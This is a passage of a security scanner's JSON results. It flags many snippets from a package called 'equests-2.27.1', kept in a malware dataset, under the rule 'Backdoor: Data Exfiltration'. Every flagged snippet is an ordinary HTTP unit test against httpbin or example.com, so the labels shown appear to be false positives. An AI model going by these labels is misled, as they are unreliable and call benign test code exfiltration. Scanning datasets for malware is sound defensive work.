                      "markdown": "`    def test_HTTP_200_OK_GET_WITH_MIXED_PARAMS(self, httpbin):\n        heads = {'User-agent': 'Mozilla/5.0'}\n\n        r = requests.get(httpbin('get') + '?test=true', params={'q': 'test'}, headers=heads)\n        assert r.status_code == 200\n\n    def test_set_cookie_on_301(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 317,
                  "startColumn": 20,
                  "endLine": 317,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    def test_HTTP_200_OK_GET_WITH_PARAMS(self, httpbin):\n        heads = {'User-agent': 'Mozilla/5.0'}\n\n        r = requests.get(httpbin('user-agent'), headers=heads)\n\n        assert heads['User-agent'] in r.text\n        assert r.status_code == 200\n",
                    "rendered": {
                      "text": "    def test_HTTP_200_OK_GET_WITH_PARAMS(self, httpbin):\n        heads = {'User-agent': 'Mozilla/5.0'}\n\n        r = requests.get(httpbin('user-agent'), headers=heads)\n\n        assert heads['User-agent'] in r.text\n        assert r.status_code == 200\n",
                      "markdown": "`    def test_HTTP_200_OK_GET_WITH_PARAMS(self, httpbin):\n        heads = {'User-agent': 'Mozilla/5.0'}\n\n        r = requests.get(httpbin('user-agent'), headers=heads)\n\n        assert heads['User-agent'] in r.text\n        assert r.status_code == 200\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 308,
                  "startColumn": 20,
                  "endLine": 308,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n    def test_fragment_maintained_on_redirect(self, httpbin):\n        fragment = \"#view=edit&token=hunter2\"\n        r = requests.get(httpbin('redirect-to?url=get')+fragment)\n\n        assert len(r.history) > 0\n        assert r.history[0].request.url == httpbin('redirect-to?url=get')+fragment\n",
                    "rendered": {
                      "text": "\n    def test_fragment_maintained_on_redirect(self, httpbin):\n        fragment = \"#view=edit&token=hunter2\"\n        r = requests.get(httpbin('redirect-to?url=get')+fragment)\n\n        assert len(r.history) > 0\n        assert r.history[0].request.url == httpbin('redirect-to?url=get')+fragment\n",
                      "markdown": "`\n    def test_fragment_maintained_on_redirect(self, httpbin):\n        fragment = \"#view=edit&token=hunter2\"\n        r = requests.get(httpbin('redirect-to?url=get')+fragment)\n\n        assert len(r.history) > 0\n        assert r.history[0].request.url == httpbin('redirect-to?url=get')+fragment\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 286,
                  "startColumn": 22,
                  "endLine": 286,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    def test_transfer_enc_removal_on_redirect(self, httpbin):\n        purged_headers = ('Transfer-Encoding', 'Content-Type')\n        ses = requests.Session()\n        req = requests.Request('POST', httpbin('post'), data=(b'x' for x in range(1)))\n        prep = ses.prepare_request(req)\n        assert 'Transfer-Encoding' in prep.headers\n\n",
                    "rendered": {
                      "text": "    def test_transfer_enc_removal_on_redirect(self, httpbin):\n        purged_headers = ('Transfer-Encoding', 'Content-Type')\n        ses = requests.Session()\n        req = requests.Request('POST', httpbin('post'), data=(b'x' for x in range(1)))\n        prep = ses.prepare_request(req)\n        assert 'Transfer-Encoding' in prep.headers\n\n",
                      "markdown": "`    def test_transfer_enc_removal_on_redirect(self, httpbin):\n        purged_headers = ('Transfer-Encoding', 'Content-Type')\n        ses = requests.Session()\n        req = requests.Request('POST', httpbin('post'), data=(b'x' for x in range(1)))\n        prep = ses.prepare_request(req)\n        assert 'Transfer-Encoding' in prep.headers\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 269,
                  "startColumn": 22,
                  "endLine": 269,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    def test_header_and_body_removal_on_redirect(self, httpbin):\n        purged_headers = ('Content-Length', 'Content-Type')\n        ses = requests.Session()\n        req = requests.Request('POST', httpbin('post'), data={'test': 'data'})\n        prep = ses.prepare_request(req)\n        resp = ses.send(prep)\n\n",
                    "rendered": {
                      "text": "    def test_header_and_body_removal_on_redirect(self, httpbin):\n        purged_headers = ('Content-Length', 'Content-Type')\n        ses = requests.Session()\n        req = requests.Request('POST', httpbin('post'), data={'test': 'data'})\n        prep = ses.prepare_request(req)\n        resp = ses.send(prep)\n\n",
                      "markdown": "`    def test_header_and_body_removal_on_redirect(self, httpbin):\n        purged_headers = ('Content-Length', 'Content-Type')\n        ses = requests.Session()\n        req = requests.Request('POST', httpbin('post'), data={'test': 'data'})\n        prep = ses.prepare_request(req)\n        resp = ses.send(prep)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 253,
                  "startColumn": 20,
                  "endLine": 253,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        assert r.history[0].is_redirect\n\n    def test_http_303_changes_post_to_get(self, httpbin):\n        r = requests.post(httpbin('status', '303'))\n        assert r.status_code == 200\n        assert r.request.method == 'GET'\n        assert r.history[0].status_code == 303\n",
                    "rendered": {
                      "text": "        assert r.history[0].is_redirect\n\n    def test_http_303_changes_post_to_get(self, httpbin):\n        r = requests.post(httpbin('status', '303'))\n        assert r.status_code == 200\n        assert r.request.method == 'GET'\n        assert r.history[0].status_code == 303\n",
                      "markdown": "`        assert r.history[0].is_redirect\n\n    def test_http_303_changes_post_to_get(self, httpbin):\n        r = requests.post(httpbin('status', '303'))\n        assert r.status_code == 200\n        assert r.request.method == 'GET'\n        assert r.history[0].status_code == 303\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 239,
                  "startColumn": 20,
                  "endLine": 239,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        assert r.history[0].is_redirect\n\n    def test_http_302_changes_post_to_get(self, httpbin):\n        r = requests.post(httpbin('status', '302'))\n        assert r.status_code == 200\n        assert r.request.method == 'GET'\n        assert r.history[0].status_code == 302\n",
                    "rendered": {
                      "text": "        assert r.history[0].is_redirect\n\n    def test_http_302_changes_post_to_get(self, httpbin):\n        r = requests.post(httpbin('status', '302'))\n        assert r.status_code == 200\n        assert r.request.method == 'GET'\n        assert r.history[0].status_code == 302\n",
                      "markdown": "`        assert r.history[0].is_redirect\n\n    def test_http_302_changes_post_to_get(self, httpbin):\n        r = requests.post(httpbin('status', '302'))\n        assert r.status_code == 200\n        assert r.request.method == 'GET'\n        assert r.history[0].status_code == 302\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 224,
                  "startColumn": 20,
                  "endLine": 224,
                  "endColumn": 26,
                  "snippet": {
                    "text": "            pytest.fail('Expected custom max number of redirects to be respected but was not')\n\n    def test_http_301_changes_post_to_get(self, httpbin):\n        r = requests.post(httpbin('status', '301'))\n        assert r.status_code == 200\n        assert r.request.method == 'GET'\n        assert r.history[0].status_code == 301\n",
                    "rendered": {
                      "text": "            pytest.fail('Expected custom max number of redirects to be respected but was not')\n\n    def test_http_301_changes_post_to_get(self, httpbin):\n        r = requests.post(httpbin('status', '301'))\n        assert r.status_code == 200\n        assert r.request.method == 'GET'\n        assert r.history[0].status_code == 301\n",
                      "markdown": "`            pytest.fail('Expected custom max number of redirects to be respected but was not')\n\n    def test_http_301_changes_post_to_get(self, httpbin):\n        r = requests.post(httpbin('status', '301'))\n        assert r.status_code == 200\n        assert r.request.method == 'GET'\n        assert r.history[0].status_code == 301\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 214,
                  "startColumn": 13,
                  "endLine": 214,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        s = requests.session()\n        s.max_redirects = 5\n        try:\n            s.get(httpbin('relative-redirect', '50'))\n        except TooManyRedirects as e:\n            url = httpbin('relative-redirect', '45')\n            assert e.request.url == url\n",
                    "rendered": {
                      "text": "        s = requests.session()\n        s.max_redirects = 5\n        try:\n            s.get(httpbin('relative-redirect', '50'))\n        except TooManyRedirects as e:\n            url = httpbin('relative-redirect', '45')\n            assert e.request.url == url\n",
                      "markdown": "`        s = requests.session()\n        s.max_redirects = 5\n        try:\n            s.get(httpbin('relative-redirect', '50'))\n        except TooManyRedirects as e:\n            url = httpbin('relative-redirect', '45')\n            assert e.request.url == url\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 201,
                  "startColumn": 20,
                  "endLine": 201,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n    def test_HTTP_302_TOO_MANY_REDIRECTS(self, httpbin):\n        try:\n            requests.get(httpbin('relative-redirect', '50'))\n        except TooManyRedirects as e:\n            url = httpbin('relative-redirect', '20')\n            assert e.request.url == url\n",
                    "rendered": {
                      "text": "\n    def test_HTTP_302_TOO_MANY_REDIRECTS(self, httpbin):\n        try:\n            requests.get(httpbin('relative-redirect', '50'))\n        except TooManyRedirects as e:\n            url = httpbin('relative-redirect', '20')\n            assert e.request.url == url\n",
                      "markdown": "`\n    def test_HTTP_302_TOO_MANY_REDIRECTS(self, httpbin):\n        try:\n            requests.get(httpbin('relative-redirect', '50'))\n        except TooManyRedirects as e:\n            url = httpbin('relative-redirect', '20')\n            assert e.request.url == url\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 193,
                  "startColumn": 20,
                  "endLine": 193,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n    def test_HTTP_307_ALLOW_REDIRECT_POST_WITH_SEEKABLE(self, httpbin):\n        byte_str = b'test'\n        r = requests.post(httpbin('redirect-to'), data=io.BytesIO(byte_str), params={'url': 'post', 'status_code': 307})\n        assert r.status_code == 200\n        assert r.history[0].status_code == 307\n        assert r.history[0].is_redirect\n",
                    "rendered": {
                      "text": "\n    def test_HTTP_307_ALLOW_REDIRECT_POST_WITH_SEEKABLE(self, httpbin):\n        byte_str = b'test'\n        r = requests.post(httpbin('redirect-to'), data=io.BytesIO(byte_str), params={'url': 'post', 'status_code': 307})\n        assert r.status_code == 200\n        assert r.history[0].status_code == 307\n        assert r.history[0].is_redirect\n",
                      "markdown": "`\n    def test_HTTP_307_ALLOW_REDIRECT_POST_WITH_SEEKABLE(self, httpbin):\n        byte_str = b'test'\n        r = requests.post(httpbin('redirect-to'), data=io.BytesIO(byte_str), params={'url': 'post', 'status_code': 307})\n        assert r.status_code == 200\n        assert r.history[0].status_code == 307\n        assert r.history[0].is_redirect\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 185,
                  "startColumn": 20,
                  "endLine": 185,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        assert r.history[0].is_redirect\n\n    def test_HTTP_307_ALLOW_REDIRECT_POST(self, httpbin):\n        r = requests.post(httpbin('redirect-to'), data='test', params={'url': 'post', 'status_code': 307})\n        assert r.status_code == 200\n        assert r.history[0].status_code == 307\n        assert r.history[0].is_redirect\n",
                    "rendered": {
                      "text": "        assert r.history[0].is_redirect\n\n    def test_HTTP_307_ALLOW_REDIRECT_POST(self, httpbin):\n        r = requests.post(httpbin('redirect-to'), data='test', params={'url': 'post', 'status_code': 307})\n        assert r.status_code == 200\n        assert r.history[0].status_code == 307\n        assert r.history[0].is_redirect\n",
                      "markdown": "`        assert r.history[0].is_redirect\n\n    def test_HTTP_307_ALLOW_REDIRECT_POST(self, httpbin):\n        r = requests.post(httpbin('redirect-to'), data='test', params={'url': 'post', 'status_code': 307})\n        assert r.status_code == 200\n        assert r.history[0].status_code == 307\n        assert r.history[0].is_redirect\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 179,
                  "startColumn": 20,
                  "endLine": 179,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        assert r.status_code == 200\n\n    def test_HTTP_302_ALLOW_REDIRECT_GET(self, httpbin):\n        r = requests.get(httpbin('redirect', '1'))\n        assert r.status_code == 200\n        assert r.history[0].status_code == 302\n        assert r.history[0].is_redirect\n",
                    "rendered": {
                      "text": "        assert r.status_code == 200\n\n    def test_HTTP_302_ALLOW_REDIRECT_GET(self, httpbin):\n        r = requests.get(httpbin('redirect', '1'))\n        assert r.status_code == 200\n        assert r.history[0].status_code == 302\n        assert r.history[0].is_redirect\n",
                      "markdown": "`        assert r.status_code == 200\n\n    def test_HTTP_302_ALLOW_REDIRECT_GET(self, httpbin):\n        r = requests.get(httpbin('redirect', '1'))\n        assert r.status_code == 200\n        assert r.history[0].status_code == 302\n        assert r.history[0].is_redirect\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 170,
                  "startColumn": 20,
                  "endLine": 170,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        assert r.status_code == 200, 'failed for scheme {}'.format(scheme)\n\n    def test_HTTP_200_OK_GET_ALTERNATIVE(self, httpbin):\n        r = requests.Request('GET', httpbin('get'))\n        s = requests.Session()\n        s.proxies = getproxies()\n\n",
                    "rendered": {
                      "text": "        assert r.status_code == 200, 'failed for scheme {}'.format(scheme)\n\n    def test_HTTP_200_OK_GET_ALTERNATIVE(self, httpbin):\n        r = requests.Request('GET', httpbin('get'))\n        s = requests.Session()\n        s.proxies = getproxies()\n\n",
                      "markdown": "`        assert r.status_code == 200, 'failed for scheme {}'.format(scheme)\n\n    def test_HTTP_200_OK_GET_ALTERNATIVE(self, httpbin):\n        r = requests.Request('GET', httpbin('get'))\n        s = requests.Session()\n        s.proxies = getproxies()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 165,
                  "startColumn": 20,
                  "endLine": 165,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        s.proxies = getproxies()\n        parts = urlparse(httpbin('get'))\n        url = scheme + parts.netloc + parts.path\n        r = requests.Request('GET', url)\n        r = s.send(r.prepare())\n        assert r.status_code == 200, 'failed for scheme {}'.format(scheme)\n\n",
                    "rendered": {
                      "text": "        s.proxies = getproxies()\n        parts = urlparse(httpbin('get'))\n        url = scheme + parts.netloc + parts.path\n        r = requests.Request('GET', url)\n        r = s.send(r.prepare())\n        assert r.status_code == 200, 'failed for scheme {}'.format(scheme)\n\n",
                      "markdown": "`        s.proxies = getproxies()\n        parts = urlparse(httpbin('get'))\n        url = scheme + parts.netloc + parts.path\n        r = requests.Request('GET', url)\n        r = s.send(r.prepare())\n        assert r.status_code == 200, 'failed for scheme {}'.format(scheme)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 156,
                  "startColumn": 26,
                  "endLine": 156,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\n    def test_whitespaces_are_removed_from_url(self):\n        # Test for issue #3696\n        request = requests.Request('GET', ' http://example.com').prepare()\n        assert request.url == 'http://example.com/'\n\n    @pytest.mark.parametrize('scheme', ('http://', 'HTTP://', 'hTTp://', 'HttP://'))\n",
                    "rendered": {
                      "text": "\n    def test_whitespaces_are_removed_from_url(self):\n        # Test for issue #3696\n        request = requests.Request('GET', ' http://example.com').prepare()\n        assert request.url == 'http://example.com/'\n\n    @pytest.mark.parametrize('scheme', ('http://', 'HTTP://', 'hTTp://', 'HttP://'))\n",
                      "markdown": "`\n    def test_whitespaces_are_removed_from_url(self):\n        # Test for issue #3696\n        request = requests.Request('GET', ' http://example.com').prepare()\n        assert request.url == 'http://example.com/'\n\n    @pytest.mark.parametrize('scheme', ('http://', 'HTTP://', 'hTTp://', 'HttP://'))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 150,
                  "startColumn": 26,
                  "endLine": 150,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        assert request.url == 'http://example.com/?test=foo'\n\n    def test_binary_put(self):\n        request = requests.Request('PUT', 'http://example.com',\n                                   data=u\"ööö\".encode(\"utf-8\")).prepare()\n        assert isinstance(request.body, bytes)\n\n",
                    "rendered": {
                      "text": "        assert request.url == 'http://example.com/?test=foo'\n\n    def test_binary_put(self):\n        request = requests.Request('PUT', 'http://example.com',\n                                   data=u\"ööö\".encode(\"utf-8\")).prepare()\n        assert isinstance(request.body, bytes)\n\n",
                      "markdown": "`        assert request.url == 'http://example.com/?test=foo'\n\n    def test_binary_put(self):\n        request = requests.Request('PUT', 'http://example.com',\n                                   data=u\"ööö\".encode(\"utf-8\")).prepare()\n        assert isinstance(request.body, bytes)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 145,
                  "startColumn": 26,
                  "endLine": 145,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        assert prep.url == 'http://example.com/?z=1&a=1&k=1&d=1'\n\n    def test_params_bytes_are_encoded(self):\n        request = requests.Request('GET', 'http://example.com',\n                                   params=b'test=foo').prepare()\n        assert request.url == 'http://example.com/?test=foo'\n\n",
                    "rendered": {
                      "text": "        assert prep.url == 'http://example.com/?z=1&a=1&k=1&d=1'\n\n    def test_params_bytes_are_encoded(self):\n        request = requests.Request('GET', 'http://example.com',\n                                   params=b'test=foo').prepare()\n        assert request.url == 'http://example.com/?test=foo'\n\n",
                      "markdown": "`        assert prep.url == 'http://example.com/?z=1&a=1&k=1&d=1'\n\n    def test_params_bytes_are_encoded(self):\n        request = requests.Request('GET', 'http://example.com',\n                                   params=b'test=foo').prepare()\n        assert request.url == 'http://example.com/?test=foo'\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 140,
                  "startColumn": 26,
                  "endLine": 140,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    def test_params_original_order_is_preserved_by_default(self):\n        param_ordered_dict = collections.OrderedDict((('z', 1), ('a', 1), ('k', 1), ('d', 1)))\n        session = requests.Session()\n        request = requests.Request('GET', 'http://example.com/', params=param_ordered_dict)\n        prep = session.prepare_request(request)\n        assert prep.url == 'http://example.com/?z=1&a=1&k=1&d=1'\n\n",
                    "rendered": {
                      "text": "    def test_params_original_order_is_preserved_by_default(self):\n        param_ordered_dict = collections.OrderedDict((('z', 1), ('a', 1), ('k', 1), ('d', 1)))\n        session = requests.Session()\n        request = requests.Request('GET', 'http://example.com/', params=param_ordered_dict)\n        prep = session.prepare_request(request)\n        assert prep.url == 'http://example.com/?z=1&a=1&k=1&d=1'\n\n",
                      "markdown": "`    def test_params_original_order_is_preserved_by_default(self):\n        param_ordered_dict = collections.OrderedDict((('z', 1), ('a', 1), ('k', 1), ('d', 1)))\n        session = requests.Session()\n        request = requests.Request('GET', 'http://example.com/', params=param_ordered_dict)\n        prep = session.prepare_request(request)\n        assert prep.url == 'http://example.com/?z=1&a=1&k=1&d=1'\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 134,
                  "startColumn": 26,
                  "endLine": 134,
                  "endColumn": 35,
                  "snippet": {
                    "text": "            ('http://example.com/path?key=value#fragment', 'http://example.com/path?key=value&a=b#fragment')\n        ))\n    def test_params_are_added_before_fragment(self, url, expected):\n        request = requests.Request('GET', url, params={\"a\": \"b\"}).prepare()\n        assert request.url == expected\n\n    def test_params_original_order_is_preserved_by_default(self):\n",
                    "rendered": {
                      "text": "            ('http://example.com/path?key=value#fragment', 'http://example.com/path?key=value&a=b#fragment')\n        ))\n    def test_params_are_added_before_fragment(self, url, expected):\n        request = requests.Request('GET', url, params={\"a\": \"b\"}).prepare()\n        assert request.url == expected\n\n    def test_params_original_order_is_preserved_by_default(self):\n",
                      "markdown": "`            ('http://example.com/path?key=value#fragment', 'http://example.com/path?key=value&a=b#fragment')\n        ))\n    def test_params_are_added_before_fragment(self, url, expected):\n        request = requests.Request('GET', url, params={\"a\": \"b\"}).prepare()\n        assert request.url == expected\n\n    def test_params_original_order_is_preserved_by_default(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 124,
                  "startColumn": 26,
                  "endLine": 124,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        assert r.headers['Content-Length'] == 'not zero'\n\n    def test_path_is_not_double_encoded(self):\n        request = requests.Request('GET', \"http://0.0.0.0/get/test case\").prepare()\n\n        assert request.path_url == '/get/test%20case'\n\n",
                    "rendered": {
                      "text": "        assert r.headers['Content-Length'] == 'not zero'\n\n    def test_path_is_not_double_encoded(self):\n        request = requests.Request('GET', \"http://0.0.0.0/get/test case\").prepare()\n\n        assert request.path_url == '/get/test%20case'\n\n",
                      "markdown": "`        assert r.headers['Content-Length'] == 'not zero'\n\n    def test_path_is_not_double_encoded(self):\n        request = requests.Request('GET', \"http://0.0.0.0/get/test case\").prepare()\n\n        assert request.path_url == '/get/test%20case'\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
